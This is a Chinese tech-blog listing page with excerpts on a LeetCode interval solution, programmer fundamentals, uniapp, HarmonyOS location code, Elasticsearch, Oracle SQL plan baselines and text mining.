class Solution { public: static bool cmp(const vector&lt;int&gt;&amp; a, const vector&lt;int&gt;&amp; b) { return a[0] &lt; b[0]; } int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) { sort(intervals.begin(), intervals.end(), cmp); int count = 0; for (int i = 1; i &lt; intervals.size(); i++) { if (intervals[i - 1][1] &gt; intervals[i][0]) { count++; intervals[i][1] = min(intervals[i - 1][1], intervals[i][1]); } } return count; } }; class Solution { public: // 按照区间右边界排序 static bool cmp (const vector&lt;int&gt;&amp; a, const vector&lt;int&gt;&amp; b) { return a[1] &lt; b[1]; } int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) { if (intervals.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc20afb2b1b9f968607afc30b0b022a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afeeca6e62a923b1f44bfca3fcd05556/" rel="bookmark">
			IT 程序员必备的核心基础知识是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IT程序员必备的核心基础知识涵盖了广泛的领域，包括计算机科学、编程语言、数据结构与算法、操作系统、计算机网络、数据库等。这些知识是程序员在进行软件开发和系统设计时所必须具备的基础，下面对每个领域进行详细的讲解。
1. 计算机科学基础 计算机科学基础是IT程序员的根基，它包括了计算机体系结构、操作系统原理、计算机组成原理、编译原理等方面的知识。程序员需要理解计算机硬件与软件之间的关系，了解计算机是如何运行和工作的，才能更好地进行软件开发和系统设计。
计算机体系结构：了解计算机的硬件组成和工作原理，包括CPU、存储器、输入输出设备等。操作系统原理：理解操作系统的功能和作用，掌握进程管理、内存管理、文件系统等基本概念。计算机组成原理：了解计算机的组成结构和指令执行过程，包括逻辑门、处理器结构、存储器层次结构等。编译原理：了解编译器的工作原理和编程语言的执行过程，包括词法分析、语法分析、语义分析等。 2. 编程语言 编程语言是程序员用来编写软件的工具，不同的编程语言适用于不同的应用场景。程序员需要熟练掌握至少一种编程语言，并了解其语法、特性和应用领域。
常见编程语言：如C、C++、Java、Python、JavaScript等，每种语言都有其独特的特点和适用范围。语言特性：包括数据类型、控制结构、函数、面向对象编程、异常处理等。编程范式：了解不同编程范式（如面向过程、面向对象、函数式编程）的特点和应用场景，以及如何利用不同范式来解决问题。 3. 数据结构与算法 数据结构与算法是程序员解决问题和优化性能的关键。程序员需要掌握常见的数据结构和算法，并能够灵活运用它们来设计和实现高效的软件系统。
常见数据结构：如数组、链表、栈、队列、树、图等，了解它们的特点、操作和应用场景。基本算法：如排序算法（冒泡排序、快速排序、归并排序等）、查找算法（顺序查找、二分查找等）、图算法（最短路径、最小生成树等）等。算法复杂度：理解算法的时间复杂度和空间复杂度，分析算法的效率和性能。 4. 操作系统 操作系统是计算机系统的核心软件，负责管理和控制计算机的硬件资源，为应用程序提供运行环境。程序员需要了解操作系统的基本原理和功能，以及如何编写和优化在操作系统上运行的程序。
进程管理：了解进程的创建、调度和通信机制，掌握进程同步与互斥的方法。内存管理：了解虚拟内存、页面置换算法、内存分配和回收等原理。文件系统：了解文件的组织结构、文件访问方式和文件系统的实现原理。 5. 计算机网络 计算机网络是连接多台计算机和设备的通信系统，程序员需要了解网络通信的基本原理和协议，以便开发和管理网络应用。
网络协议：了解TCP/IP协议栈、HTTP、FTP、SMTP等常用协议的工作原理和应用场景。网络编程：掌握Socket编程和网络通信的基本方法，能够实现客户端和服务器端的程序。网络安全：了解常见的网络攻击和防范措施，如DDoS攻击、SQL注入等。 6. 数据库 数据库是存储和管理数据的系统，程序员需要了解数据库的基本原理和操作方法，以便设计和优化数据库应用。
数据库原理：了解数据库的组织结构、数据模型和操作语言，如关系型数据库、NoSQL数据库等。SQL语言：掌握SQL语言的基本语法和操作，能够编写复杂的数据库查询和更新语句。数据库设计：了解数据库设计的基本原则和范式，能够设计和优化数据库表结构。 7. 软件工程 软件工程是指导软件开发过程的原则和方法，包括需求分析、设计、编码、测试、部署和维护等阶段。程序员需要了解软件工程的基本原理和流程，以便进行规范的软件开发和项目管理。
8. Web开发 随着互联网的发展，Web开发已成为IT程序员必备的技能之一。程序员需要掌握Web开发的基本原理和技术，能够设计和实现各种类型的Web应用。
9. 人工智能和大数据 人工智能和大数据技术已成为IT行业的热门领域，程序员需要了解人工智能和大数据的基本原理和应用，以应对未来的发展趋势。
10. 系统架构和设计模式 系统架构和设计模式是程序员在设计和实现复杂软件系统时必备的知识，它们能够帮助程序员构建可扩展、可维护和高效的系统。
软件开发模型：了解常见的软件开发模型，如瀑布模型、迭代开发、敏捷开发等。需求分析：掌握需求分析的方法和技巧，能够理解用户需求并将其转化为可执行的软件开发任务。设计原则：了解软件设计的基本原则和模式，如DRY原则（Don't Repeat Yourself）、KISS原则（Keep It Simple, Stupid）、SOLID原则等。编码规范：掌握良好的编码风格和规范，能够编写清晰、可读、可维护的代码。测试与调试：了解软件测试的方法和工具，能够编写单元测试、集成测试和系统测试，并能够进行故障排查和调试。版本控制：掌握版本控制工具，如Git、SVN等，能够有效地管理和协作开发代码。持续集成：了解持续集成和持续交付的概念和实践，能够构建自动化的开发、测试和部署流程。前端开发：掌握HTML、CSS、JavaScript等前端技术，能够实现Web页面的设计和交互效果。后端开发：掌握服务器端开发语言和框架，如Node.js、Django、Spring Boot等，能够实现Web应用的业务逻辑和数据处理。数据库开发：掌握数据库设计和操作，能够实现数据的存储和管理。Web服务：了解RESTful API和Web服务的设计和实现原理，能够构建可扩展和可维护的Web服务。机器学习：了解机器学习的基本概念和算法，能够使用机器学习工具和框架进行数据分析和模型训练。深度学习：了解深度学习的原理和技术，掌握深度学习框架和算法，能够构建和训练深度神经网络模型。大数据技术：了解大数据的处理和分析技术，包括分布式存储、MapReduce、Hadoop、Spark等。数据挖掘：掌握数据挖掘的方法和工具，能够发现数据中的模式和规律，提取有用的信息和知识。系统架构：了解系统架构的基本原理和设计方法，能够设计和实现分布式系统、微服务架构等。设计模式：掌握常见的设计模式，如单例模式、工厂模式、观察者模式等，能够灵活运用设计模式解决实际问题。 IT程序员必备的核心基础知识涵盖了计算机科学、编程语言、数据结构与算法、操作系统、计算机网络、数据库、软件工程、Web开发、人工智能和大数据、系统架构和设计模式等多个方面。这些知识是程序员进行软件开发和系统设计所必须具备的基础，只有掌握了这些知识，程序员才能够在不同的领域中发挥自己的创造力和能力，设计和实现高质量的软件系统。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc905cd253ee0b342c45d0862a718144/" rel="bookmark">
			uniapp小程序：内存超过2mb解决方法（简单）message：Error: 上传失败：网络请求错误 代码包大小超过限制。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分析：这种情况是代码文件内存超过2mb无法进行预览上传
解决方法：
1、Hbuilder中点击运行--&gt;运行到小程序模拟器---&gt;运行时是否压缩代码
2、在微信小程序中点击详情---&gt;本地设置：
3、点击预览即可运行了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/206493abbe4e27757f8903067414c81a/" rel="bookmark">
			鸿蒙HarmonyOS获取GPS精确位置信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考官方文档
#1.初始化时获取经纬度信息
aboutToAppear() { this.getLocation() } async getLocation () { try { const result = await geoLocationManager.getCurrentLocation() AlertDialog.show({ message: JSON.stringify(result) }) }catch (error) { AlertDialog.show({ message: error.message }) } } #2.配置位置权限信息
"requestPermissions": [ //API9之前只申请这个就可以米级定位 {'name': 'ohos.permission.LOCATION'},//API9之前申请的权限 //API9后两个权限同时申请才可以获取米级定位，只下边一个权限只能精准到5公里 {'name': 'ohos.permission.APPROXIMATELY_LOCATION'},//API9及之后需要增加申请的权限 { "name": 'ohos.permission.LOCATION_IN_BACKGROUND' } ], #3.访问设备的位置信息，必须申请权限，并且获得用户授权
在src/main/ets/entryability/EntryAbility.ts里申请
import abilityAccessCtrl from '@ohos.abilityAccessCtrl' async onCreate(want: Want, launchParam: AbilityConstant.LaunchParam): Promise&lt;void&gt; { hilog.info(0x0000, 'testTag', '%{public}s', 'Ability onCreate'); let manger = abilityAccessCtrl.createAtManager() try { await manger.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/206493abbe4e27757f8903067414c81a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fe5b32e5d944d3946f0088bf9cbdd68/" rel="bookmark">
			搜维尔科技：【简报】元宇宙数字人赛道，《救食有道》！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在这个快速发展的数位时代里，本组相信透过制作融合虚拟人物 与 AI 智慧的创新宣传影片，定能为食物银行提高曝光率并让更多人 投身参与并落实减少食物浪费的行动，并与本组共同在生活中宣传食 物银行的理念
学校： 桃园市立中场商业高级中等学校 选手： Fearless
角色姓名： 小希、承扬、露露 角色物种： 人类
角色简介：
在这个快速发展的数位时代里，本组相信透过制作融合虚拟人物 与 AI 智慧的创新宣传影片，定能为食物银行提高曝光率并让更多人 投身参与并落实减少食物浪费的行动，并与本组共同在生活中宣传食 物银行的理念.
首先，我们引进 AI 小精灵作为食物银行的形象代言人。这个虚 拟人物被设计成极具科技感并保有些俏皮可爱、亲和力十足的形象， 肩负着代表宣传食物银行的使命。AI 小精灵将透过与角色们的互动， 传达食物浪费的影响及食物银行的重要性及理念。引导观众进入食物 银行的世界，与他们分享食物援助的重要性和意义。
我们的组员们也在制作过程中亲自前往位于内坜的慈馨食物银 行进行探访，透过我们的亲眼所见以及志工阿姨们的口述，了解平时 食物银行的运作及志工们在食物银行的日常工作，也感谢他们愿意开 放我们在店内拍照，提供我们资料，帮助我们在撰写文章时可以更加 顺利。
而在我们所设计的角色中，男女主角们从一般民众的角度去探索 食物银行的日常，且亲自协助拍摄推广影片的活动，从一开始对食物 银行的认知一片空白，到最后理解助人的快乐并且乐在其中，完整呈 现出许多志工们一路以来的心路历程。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d93e17ae58752e8b9afadd9ecb5ed3ab/" rel="bookmark">
			【java题解】题目 1779: 你的第一个程序；题目 1779: 你的第一个程序；题目 1173: 计算球体积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
题目 1779: 你的第一个程序
题目描述
输入格式
输出格式
样例输入
样例输出
题解 题目 1173: 计算球体积
题目描述
输入格式
输出格式
样例输入
样例输出
题解
题目 1267: A+B Problem
题目描述
输入格式
输出格式
样例输入
样例输出
题解
从今天开始我写一个Java练习的专栏，用于备赛4月份的蓝桥杯Java组的比赛。每一篇文章有三道题目，大家可以跟着我的节奏一起练习。我将完全以Java初学者的身份，系统的练习各种题目，相信练习完我这一专栏的所有题目，4月份的比赛拿一个省一还是不难的，加油吧。
题目 1779: 你的第一个程序 题目描述 同学们，动手写出第一个C语言或C++或Java或任意语言程序吧！打开你的编译器，打印一句话，在屏幕上显示出 Just do IT 写下你的决心吧！
输入格式 没有输入，程序运行起来直接输出这句话就可以
输出格式 Just do IT
样例输入 无 样例输出 Just do IT
题解 System.out.println("");输出语句，这道题直接输出即可。
public class Main{ public static void main(String[] args){ System.out.println("Just do IT"); } } 题目 1173: 计算球体积 题目描述 根据输入的半径值，计算球的体积。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d93e17ae58752e8b9afadd9ecb5ed3ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4174a75aa2251c0c28e43e36c2cc7459/" rel="bookmark">
			ES系列索引、文档、集群、技术原理文章目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基础 ES的一些名词和概念总结
ES 可扩展、高可靠、使用场景等常见问题
索引/文档操作 索引 ES-index索引配置
文档 ES-DynamicMapping、文档字段类型
ES-索引、文档插入、更新、删除、脚本API和Query参数
ES-aggregation聚合分析
ES-API约定
集群 ES集群安装和启动图解
ES集群节点、主从、负责均衡
技术原理 ES文档索引、查询、分片、文档评分和分析器技术原理
ES性能优化和注意事项
ES集群节点、主从、负责均衡
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c668468373667ee29ba3601664579f9b/" rel="bookmark">
			17.正在运行的数据库是否能开启执行计划自动捕获Doc ID 1520337.1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.执行计划基线可以开启的理由
(1) 优化器 capture_sql_plan_baselines 控制sql计划管理的所有计划的自动捕获，这是一个常见的误解。事实上，optimizer_capture_sql_plan_baselines 仅控制特定sql语句的第一个计划的捕获。也就是说，仅适用于当前没有任何计划记录在计划历史记录中的SQL语句。 第一个捕获总是放在语句的SQL计划基线中——它被启用并接受。 --执行计划历史 select distinct SQL_ID,PLAN_HASH_VALUE,to_char(TIMESTAMP,'yyyymmdd hh24:mi:ss') TIMESTAMP from dba_hist_sql_plan where SQL_ID='68wnxdjxwwn2h' order by TIMESTAMP; (2) 一旦存在由SQL_HANDLE标识的SQL语句，优化器_capture_SQL_plan_baselines就不再对捕获其他计划有任何影响。 每当optimizer_use_sql_plan_baselines=TRUE时，为语句找到的新计划将记录在历史记录中。 创建这些计划是为了使其可用于计划演变，但创建为不可接受，因此在验证之前不会使用这些计划。 此演进过程使用DBMS_SPM运行。EVOLVE_SQL_PLAN_BASELINES。 如果一个固定的计划在基线中——也就是说，对于该语句存在一个已启用、已接受和已固定的计划——则该 SQL语句不可用于计划演变。因此，将基线中计划的FIXED属性设置为YES也会禁用此捕获过程。 (3) 如果您不希望为具有基线的SQL语句捕获其他计划，则必须将基线中的计划设置为FIXED=YES。 "固定"应理解为不应制定计划。（请注意，您许多人都需要FIXED=YES和ENABLED=YES，在11g上这是需要的。） (4) 如果希望将具有基线的SQL语句的附加捕获计划标记为ACCEPTED=YES，则必须使用DBMS_SPM对其进行演化。 EVOLVE_SQL_PLAN_BASELINES。（注意：在12c中，除非您禁用，否则进化过程将在维护窗口期间自动运行。） 您可以使用verify=&gt;"NO"强制接受它们，而无需验证它们是否运行良好。 注意：请记住，只执行一次的SQL语句不会从SQL计划基线中受益。 即使optimizer_capture_sql_plan_baselines为TRUE，自动计划捕获也仅发生在已执行至少两次的sql语句上。 2.总结 执行计划基线管理是可以开启的。
开启后人工介入的机会增多。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e922ba0541b42bf4a06634bcb302d3e/" rel="bookmark">
			ES-API约定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多索引 expand_wildcards 设置是否扩展通配符到closed的index中，open表示只在匹配并为open的index中查询，closed表示在匹配的所有的index中查询, 默认为closed。
值为open，close，none，all。
open:表示只支持open类型的索引close:表示只支持关闭状态的索引none:表示不可用all:表示同时支持open和close索引 allow_no_indices 当使用通配符查询时，当有索引不存在的时候是否返回查询失败。值为true和false,默认为true。
allow_no_indices 跟 ignore_unavailable 都是用来防止没有索引的错误的，它们的区别是：
ignore_unavailable控制的是任何索引包括带通配符和不带通配符的allow_no_indices 控制的是带通配符的索引 ignore_unavailable 如果URL中一个或多个索引不存在的时候，是否忽略这些索引，值为true和false，默认为true。
索引名称对 Date 和 Math 的支持 Date math 索引名称解析可以让您搜索一系列 time-series indices（时间序列索引），而不是搜索所有时间序列索引并过滤结果或维护 aliases（别名）。限制搜索的索引数量减少了集群上的集群上的负载，并提高了执行性能。例如，如果您在日常日志中 searching for errors（搜索错误 )，则可以使用 date math name 模板将搜索限制为过去两天。
几乎所有的具有索引参数的 API 都支持在 index parameter value（索引参数值）中包含 date math 。
date math 索引名称采用以下形式 :
&lt;static_name{date_math_expr{date_format|time_zone}}&gt; 上述的说明 :
static_name：是索引名称的 static text（ 静态文本）部分date_math_expr：是动态计算日期的动态 date math 表达式date_format：是计算日期应呈现的可选格式。默认是 YYYY.MM.ddtime_zone：是可选的时区。默认为 utc 。 你必须将 date math 索引名称表达式包含在尖括号中，并且所有的特殊字符都应进行 URI 编码。例如 :
# GET /&lt;logstash-{now/d}&gt;/_search curl -XGET 'localhost:9200/%3Clogstash-%7Bnow%2Fd%7D%3E/_search?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e922ba0541b42bf4a06634bcb302d3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9b8d71dd4c3ad00da90fc136a259039/" rel="bookmark">
			ES文档索引、查询、分片、文档评分和分析器技术原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		技术原理 索引文档 索引文档分为单个文档和多个文档。
单个文档 新建单个文档所需要的步骤顺序：
客户端向 Node 1 发送新建、索引或者删除请求。节点使用文档的 _id 确定文档属于分片 0 。请求会被转发到 Node 3，因为分片 0 的主分片目前被分配在 Node 3 上。Node 3 在主分片上面执行请求。如果成功了，它将请求并行转发到 Node 1 和 Node 2 的副本分片上。一旦所有的副本分片都报告成功, Node 3 将向协调节点报告成功，协调节点向客户端报告成功。 多个文档 使用 bulk 修改多个文档步骤顺序：
客户端向 Node 1 发送 bulk 请求。Node 1 为每个节点创建一个批量请求，并将这些请求并行转发到每个包含主分片的节点主机。主分片一个接一个按顺序执行每个操作。当每个操作成功时，主分片并行转发新文档（或删除）到副本分片，然后执行下一个操作。 一旦所有的副本分片报告所有操作成功，该节点将向协调节点报告成功，协调节点将这些响应收集整理并返回给客户端。 索引文档的实现机制 写操作的关键点
在考虑或分析一个分布式系统的写操作时，一般需要从下面几个方面考虑：
可靠性：或者是持久性，数据写入系统成功后，数据不会被回滚或丢失。一致性：数据写入成功后，再次查询时必须能保证读取到最新版本的数据，不能读取到旧数据。原子性：一个写入或者更新操作，要么完全成功，要么完全失败，不允许出现中间状态。隔离性：多个写入操作相互不影响。实时性：写入后是否可以立即被查询到。性能：写入性能，吞吐量到底怎么样。 Elasticsearch作为分布式系统，通过如何保证的呢？
可靠性：由于Lucene的设计中不考虑可靠性，在Elasticsearch中通过Replica和TransLog两套机制保证数据的可靠性。一致性：Lucene中的Flush锁只保证Update接口里面Delete和Add中间不会Flush，但是Add完成后仍然有可能立即发生Flush，导致Segment可读。这样就没法保证Primary和所有其他Replica可以同一时间Flush，就会出现查询不稳定的情况，这里只能实现最终一致性。原子性：Add和Delete都是直接调用Lucene的接口，是原子的。当部分更新时，使用Version和锁保证更新是原子的。隔离性：仍然采用Version和局部锁来保证更新的是特定版本的数据。实时性：使用定期Refresh Segment到内存，并且Reopen Segment方式保证搜索可以在较短时间（比如1秒）内被搜索到。通过将未刷新到磁盘数据记入TransLog，保证对未提交数据可以通过ID实时访问到。性能：性能是一个系统性工程，所有环节都要考虑对性能的影响，在Elasticsearch中，在很多地方的设计都考虑到了性能，一是不需要所有Replica都返回后才能返回给用户，只需要返回特定数目的就行；二是生成的Segment现在内存中提供服务，等一段时间后才刷新到磁盘，Segment在内存这段时间的可靠性由TransLog保证；三是TransLog可以配置为周期性的Flush，但这个会给可靠性带来伤害；四是每个线程持有一个Segment，多线程时相互不影响，相互独立，性能更好；五是系统的写入流程对版本依赖较重，读取频率较高，因此采用了versionMap，减少热点数据的多次磁盘IO开销。Lucene中针对性能做了大量的优化。 Elasticsearch的写
Elasticsearch采用多Shard方式，通过配置routing规则将数据分成多个数据子集，每个数据子集提供独立的索引和搜索功能。当写入文档的时候，根据routing规则，将文档发送给特定Shard中建立索引。这样就能实现分布式了。
此外，Elasticsearch整体架构上采用了一主多副的方式：
每个Index由多个Shard组成，每个Shard有一个主节点和多个副本节点，副本个数可配。但每次写入的时候，写入请求会先根据_routing规则选择发给哪个Shard，Index Request中可以设置使用哪个Filed的值作为路由参数，如果没有设置，则使用Mapping中的配置，如果mapping中也没有配置，则使用_id作为路由参数，然后通过_routing的Hash值选择出Shard（在OperationRouting类中），最后从集群的Meta中找出出该Shard的Primary节点。
请求接着会发送给Primary Shard，在Primary Shard上执行成功后，再从Primary Shard上将请求同时发送给多个Replica Shard，请求在多个Replica Shard上执行成功并返回给Primary Shard后，写入请求执行成功，返回结果给客户端。
这种模式下，写入操作的延时就等于latency = Latency(Primary Write) + Max(Replicas Write)。只要有副本在，写入延时最小也是两次单Shard的写入时延总和，写入效率会较低，但是这样的好处也很明显，避免写入后，单机或磁盘故障导致数据丢失，在数据重要性和性能方面，一般都是优先选择数据，除非一些允许丢数据的特殊场景。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9b8d71dd4c3ad00da90fc136a259039/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba952a0130c84156b60cbedf7894fa58/" rel="bookmark">
			文本挖掘解锁信息时代的秘密武器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每天浏览新闻网站，阅读各种标题，了解世界大事。这些看似简单的活动，其实与文本挖掘息息相关。文本挖掘，简而言之，是从大量文本数据中提取有价值信息的过程。类似于在沙滩上寻找金子，但这里的沙滩是文本数据，金子则是有用的信息。
在日常生活中，文本挖掘无处不在。比如，电子邮件过滤器就是一个例子。它通过分析成千上万的电子邮件内容，学习识别哪些是垃圾邮件。再比如在线购物网站，通过分析用户评论，自动总结出产品的优点和缺点。这些都是文本挖掘的实际应用，它们让复杂的数据分析变得生活化，接近人们的日常体验。
这种技术不仅仅局限于互联网领域。在医疗健康、金融分析、市场研究等多个领域，文本挖掘都发挥着重要作用。通过分析病历记录、财务报告或消费者反馈，可以发现模式和趋势，这对于决策支持和知识发现至关重要。
文本挖掘作为一种技术，它的价值不仅仅在于处理数据的能力，更在于将这些数据转化为有意义的洞察，帮助改善我们的生活和工作。通过这样的实例，文本挖掘不再是一个遥远和抽象的概念，而是成为了日常生活中可见、可感的技术。
文章目录 文本挖掘的发展历程数据挖掘和文本挖掘的区别文本挖掘的通常流程文本挖掘的实际应用聚焦词频：解锁文本的核心内容文本预测：预见未来的可能性文本分类：条理化海量信息 文本挖掘的局限性总结 文本挖掘的发展历程 文本挖掘的历史与信息技术的发展紧密相连，特别是在自然语言处理（NLP）和机器学习领域的进步对其产生了深远影响。早期，文本挖掘的概念主要围绕信息检索，即从大量文本中找到具体信息。这个阶段的技术主要依赖于关键词搜索，这种方法简单但往往缺乏深度和准确性。
随着时间的推移，文本挖掘开始融入更复杂的统计方法和算法。20世纪90年代，随着互联网的兴起和数据量的激增，文本挖掘开始迅速发展。这个时期的技术革新使得能够处理更复杂的文本数据，并从中提取有意义的模式和趋势。
进入21世纪，特别是在过去的十年里，机器学习和人工智能技术的突飞猛进极大地推动了文本挖掘的能力。现在，不仅可以识别文本中的关键信息，还能理解语境、情感甚至是讽刺和幽默。此外，深度学习的兴起使得文本挖掘不再局限于结构化数据，可以更加深入地分析非结构化的文本，如社交媒体帖子、产品评论等。
这一时期也见证了文本挖掘在各行各业的广泛应用，从市场分析、客户服务到公共政策研究，文本挖掘的应用领域日益扩大。同时，随着计算能力的增强和算法的优化，文本挖掘变得更加高效和准确，为从海量文本数据中挖掘有价值的信息提供了强大的支持。
数据挖掘和文本挖掘的区别 在探讨数据挖掘和文本挖掘的区别时，首先要理解它们共同的目的是从大量数据中提取有价值的信息。然而，它们处理的数据类型和方法存在明显的差异。数据挖掘通常涉及结构化数据，比如数据库中的表格，重点在于发现数据间的模式和关联。想象一下超市的交易记录，通过数据挖掘可以发现哪些产品常常一起被购买，从而优化库存和营销策略。
相比之下文本挖掘专注于非结构化的文字数据，这类数据更加复杂，因为它涉及到自然语言的理解。文本挖掘的挑战在于将文字转化为可以分析的数据格式，进而提取出有用的信息。例如，通过分析社交媒体上的评论，可以了解公众对某个话题的看法和情绪。虽然数据挖掘和文本挖掘在目标上一致，即从大量数据中提取价值，但它们处理的数据类型和技术方法大相径庭。数据挖掘更多处理数字和事实，而文本挖掘则涉猎语言和表达的复杂世界。
谈到文本挖掘的优势，可以从它如何增强信息获取和知识发现的角度来看。文本挖掘能够处理大量的文字数据，这些数据是传统数据库和数据分析方法难以触及的。想象一下互联网上海量的博客文章、新闻报道和社交媒体帖子，这些都是文本挖掘的应用场景。
文本挖掘能够揭示趋势和模式。例如在社交媒体分析中，通过文本挖掘可以发现特定话题的流行趋势或公众情绪的变化。其次，文本挖掘有助于快速归类和组织信息。通过算法，可以将相关文档自动分类，便于用户快速找到所需信息。再者，文本挖掘在提供个性化推荐方面也显得尤为重要，如通过分析用户的评论和反馈来推荐相关产品或内容。
文本挖掘不仅使处理非结构化文本数据成为可能，而且提供了深入洞察和理解这些数据的手段。它的应用范围广泛，从商业智能到社会科学研究，无不体现其强大的价值。
文本挖掘的通常流程 文本挖掘作为从文本中提取有价值信息的过程，涉及一系列步骤，这些步骤共同构成了其核心框架。整个流程的核心在于将大量、杂乱的文本数据转化为结构化、有意义的信息，这不仅有助于深入理解数据背后的模式，而且还能支持决策过程和新知识的发现。通过这种方式，文本挖掘能够揭示隐藏在普通文本之中的深刻洞见。
文本挖掘开始于数据的收集，这通常意味着从各种来源聚集文本数据，例如社交媒体、新闻文章、书籍或在线论坛。收集到的数据多种多样，从结构化的数据库表格到非结构化的文本段落都有可能。
数据预处理这个阶段的重点是清洗和组织收集到的数据，使其适合分析。预处理包括去除无关内容（如标点符号和停用词），文本标准化（例如，统一单词的大小写），以及可能的词干提取，这意味着将单词还原为其基本形式。例如，“running”、“runs”和“ran”都可以还原为“run”。
紧接着是特征提取，这一步骤是将文本转化为一种形式，使计算机能够理解和处理。在许多情况下，这涉及到将文本转换为向量形式。一种常用的方法是词袋模型，它将文本转换为一个表示单词出现频率的向量。这个过程忽略了单词在文本中的顺序，但仍能提供有用的信息。
随后进行的是核心的分析过程，可能包括诸如主题建模、情感分析、文本分类或聚类等任务。在这个阶段，利用各种算法挖掘文本数据的深层次模式和趋势。例如，在情感分析中，系统会学习识别文本中的积极或消极情绪。
文本挖掘的结果通常需要进行解释和可视化，以便用户可以理解和利用这些信息。这可能包括制作图表、生成摘要或甚至是创建交互式仪表板，旨在使数据分析结果直观且易于理解。
文本挖掘的实际应用 在当今信息时代文本挖掘不仅是一种技术，更是连接数据与日常生活的桥梁。其应用范围广泛，从简单的词频聚合到复杂的文本预测和分类，文本挖掘在各个领域中发挥着重要作用。
词频聚合是文本挖掘中最基本的应用之一。通过分析文本中词汇的出现频率，可以揭示出文本的主要主题或趋势。例如，在社交媒体分析中，通过统计热门话题或标签的频率，可以快速了解公众关注的焦点。这不仅对营销人员至关重要，还可以帮助新闻机构追踪热点事件。
文本预测则是一种更为高级的应用。它利用历史数据来预测未来的趋势或结果。例如，在股市分析中，通过分析历史新闻报道和财务报告，文本挖掘技术可以预测股票价格的走势。这种技术的应用不限于金融领域，还广泛应用于天气预测、产品需求预测等多个方面。
文本分类则是将文本自动分配到预定义的类别中。这在处理大量文档时尤为重要。比如，电子邮件过滤器就是一个典型例子，它通过分析邮件内容，将垃圾邮件和重要邮件自动分类。在法律领域，文本分类可以帮助律师快速筛选相关的案例文件，极大提高工作效率。
这些应用展示了文本挖掘如何深入我们生活的各个方面，它不仅使数据处理变得更加高效，还开启了从大数据中提取有价值信息的新方式。从商业智能到社会研究，文本挖掘的应用正在不断扩展，其潜力仍有待进一步挖掘。
聚焦词频：解锁文本的核心内容 词频聚合，就是对文本中词汇出现次数的统计和分析。在这个过程中，最常见的词汇被提取出来，为理解文本的核心提供了关键线索。例如，在进行新闻摘要时，通过词频聚合可以迅速识别出文章的主要话题。在情感分析中，高频出现的情感词汇帮助判断整体情绪倾向。同样，主题模型和舆情分析也依赖于词频聚合来确定文本的主题趋势或公众情绪。
文本挖掘的初始步骤往往是词频分析，它为进一步的深入分析奠定了基础。词频图表是这一点的直观展示，它清晰地显示了在不同主题或领域中哪些词汇频繁出现。
文本预测：预见未来的可能性 文本挖掘在预测方面的应用同样引人注目。通过监督学习方法，可以从文本数据中预测特定的事件或趋势。这种分析不仅限于句子结构，还可以融合如年龄、性别等额外信息，从而提升预测的准确性。无论是从产品评论预测回购率，还是从调查结果预测未来行为，文本预测都显示了其强大的分析能力。
文本预测的应用领域广泛，包括但不限于情感预测、点击率预测、销售趋势预测、舆情趋势预测以及市场趋势预测。这些应用不仅为个人和企业提供了深入洞察，还为决策者提供了宝贵的前瞻性信息。
文本分类：条理化海量信息 文本分类则将文本挖掘推向了一个新的维度。无论是监督学习还是无监督学习，文本分类都在其中发挥着重要作用。分类过程涉及将文本归入预定义的类别或标签，使得管理和分析变得更加高效。
从新闻分类、社交媒体内容分类，到邮件管理、舆情监测，乃至商品信息组织和评论分析，文本分类的应用场景丰富多样。通过精准的分类，用户可以更轻松地找到所需信息，企业和组织可以更有效地管理和分析数据。
在文本挖掘的世界里，每一段文字都充满了潜在的信息和意义。通过词频聚合、文本预测和文本分类，这些隐藏在文字之中的秘密被逐一解锁，为决策提供支持，为理解提供途径。
文本挖掘的局限性 文本挖掘虽然是一项强大的技术，能够从大量文本中提取有价值的信息，但它并非万能。首先，文本挖掘依赖于数据的质量和量。如果数据充满错误、歧义或不一致性，结果可能会受到严重影响。例如，从社交媒体收集的文本数据可能包含大量的俚语、错误拼写或不规范的语法，这些都会对文本挖掘的准确性产生负面影响。
